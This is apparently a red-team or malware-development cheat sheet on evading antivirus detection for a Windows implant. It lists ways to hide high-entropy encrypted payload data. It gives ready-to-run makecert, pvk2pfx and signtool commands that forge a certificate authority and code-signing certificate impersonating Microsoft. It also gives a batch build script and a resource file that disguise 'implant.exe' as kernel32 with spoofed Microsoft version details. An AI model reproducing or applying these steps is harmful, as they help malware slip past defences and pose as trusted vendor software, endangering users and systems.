## Executable with high entropy
High entropy == encrypted data == detection

Solutions:
- putting encrypted data on the stack (.text section)
- concatenate data to a image in the .rsrc section
- concatenate entire executable with another benign executable
- convert encrypted data to hexstring/guid like string

## Missing binary signature
Self signed CA:
```shell
makecert -r -pe -n "CN = Microsoft Root Certificate Authority 2010,O = Microsoft Corporation,L = Redmond,S = Washington,C = US" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv CA.pvk CA.cer
```

Self signed cert:
```shell
makecert -pe -n "CN=Microsoft Windows Production PCA 2011,O = Microsoft Corporation,L = Redmond,S = Washington,C = US" -a sha256 -cy end -sky signature -eku 1.3.6.1.5.5.7.3.3,1.3.6.1.4.1.311.10.3.24,1.3.6.1.4.1.311.10.3.6 -ic CA.cer -iv CA.pvk -sv SPC.pvk SPC.cer
```

Convert to PFX:
```shell
pvk2pfx -pvk SPC.pvk -spc SPC.cer -pfx SPC.pfx
```

Sign binary:
```shell
signtool sign /v /f SPC.pfx EXECUTABLE
```

## Missing executable details/description
ResHacker.exe > File > Open... > EXECUTABLE > Action > Add from a Resource file... > c:/windows/system32/kernel32.dll

or using batch file to compile it automatically:
```shell
@ECHO OFF

rc ver.rc
cvtres /MACHINE:x64 /OUT:ver.o ver.res
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 ver.o

del *.obj *.o *.res
```

Using this resource file:
```
1 VERSIONINFO
FILEVERSION 10,0,17763,475
PRODUCTVERSION 10,0,17763,475
FILEOS 0x40004
FILETYPE 0x2
{
	BLOCK "StringFileInfo"
	{
		BLOCK "040904B0"
		{
			VALUE "CompanyName", "Microsoft Corporation"
			VALUE "FileDescription", "Windows NT BASE API Client DLL"
			VALUE "FileVersion", "10.0.17763.475 (WinBuild.160101.0800)"
			VALUE "InternalName", "kernel32"
			VALUE "LegalCopyright", "\xA9 Macrohard Corporation. All rights reserved."
			VALUE "OriginalFilename", "kernel32"
			VALUE "ProductName", "Microsoft\xAE Windows\xAE Operating System"
			VALUE "ProductVersion", "10.0.17763.475"
		}
	}
	
	BLOCK "VarFileInfo"
	{
		VALUE "Translation", 0x0409 0x04B0  
	}
}
```